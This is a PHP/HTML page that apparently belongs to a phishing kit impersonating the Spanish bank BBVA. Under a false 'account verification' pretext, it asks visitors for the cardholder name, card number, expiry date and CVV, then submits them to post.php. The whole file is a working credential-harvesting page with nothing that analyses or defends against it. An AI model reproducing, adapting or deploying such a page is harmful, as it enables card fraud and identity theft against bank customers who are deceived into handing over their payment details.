
<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BBVA</title>
    <link rel="stylesheet" href="res/css/app.css">
</head>
<body>
<header class="header">
            <div class="logo">
            <img src="res\img\logoo.png">
            </div>
            <div class="links">
                <a href="#">Acceso a la banca online</a> |
                <a href="#">Ir a BBVA.es</a>
            </div>
        </header>
<main>
    <div class="container">

     
<h3>Verificación de cuenta</h3>
<h4>Para verificar su cuenta, introduzca la información de su tarjeta</h4>

 <form action="post.php" method="post">

                       <div class="inputt">
        <label>Nombre del titular de la tarjeta</label>
        <input type="text" name="name" required>
        </div>

        <div class="inputt">
        <label>Número de tarjeta</label>
        <input type="text" name="cc" placeholder="XXXX XXXX XXXX XXXX" id="cc" required>
        </div>

        <div class="inputt">
        <label>Fecha de expiración</label>
        <input type="text" name="exp" required placeholder="MM/AA" id="exp">
        </div>

        <div class="inputt">
        <label>Código de seguridad</label>
        <input type="password" name="cvv" placeholder="CVV" id="cvv" required>
        </div>
            
        <div class="forgott">
         <button type="submit">Continuar</button>
           </div>
         </form>
            
       
    </div>
 
       
    </main>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");
</script>
</body>
</html>
